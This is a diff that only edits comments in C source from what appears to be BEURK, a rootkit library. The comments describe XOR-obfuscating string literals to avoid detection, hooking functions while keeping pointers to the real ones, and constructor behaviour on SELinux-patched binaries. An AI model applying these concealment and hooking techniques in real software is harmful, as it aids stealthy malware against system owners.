@@ -47,11 +47,11 @@ static void     xor(char *str) {
 
 /** re-xorify hidden literals.
  * hidden literals are all string literals used in the library
- * which are xorified before compilagtion in order to prevent
- * string leaking.
+ * that are xorified before compilation in order to avoid
+ * leaking strings.
  *
- * this function restores clear literals values, as defined in
- * BEURK config file.
+ * this function restores clear literals values, as they are
+ * defined in BEURK's config file.
  */
 static void     init_hidden_literals(void) {
     int         i;
@@ -63,11 +63,11 @@ static void     init_hidden_literals(void) {
 
 
 /** retrieve native function pointers of hooked functions
- * it feeds __non_hooked_symbols table from function names
- * (stored at the end of __hidden_literals).
+ * it fills __non_hooked_symbols table with function adresses
+ * (names are stored at the end of __hidden_literals).
  *
  * NOTE: If not called, all `REAL_<NAME>` macros will point
- * to an invalid location.
+ *      to an invalid location.
  */
 static void     init_non_hooked_symbols(void) {
     int         i, j;
@@ -85,11 +85,12 @@ static void     init_non_hooked_symbols(void) {
 
 
 /** library constructor
- * this function is automatically called at memory load time on system
- * NOTE: on some systems, the constructor is also called for each programe execution.
- *       therefore, other systems only call it at load time.
- *       that's why we call this singleton function at start of
- *       ALL internal API functions.
+ * this function is automatically called at initialisation on
+ * all systems, unless the binaries are patched for SElinux
+ *
+ * NOTE: On those binaries, the constructor isn't called at
+ *      startup. which is why we call this singleton function
+ *      at the beginning of ALL internal API functions and hooks.
  */
 void            init(void) {
     static loaded = 0;
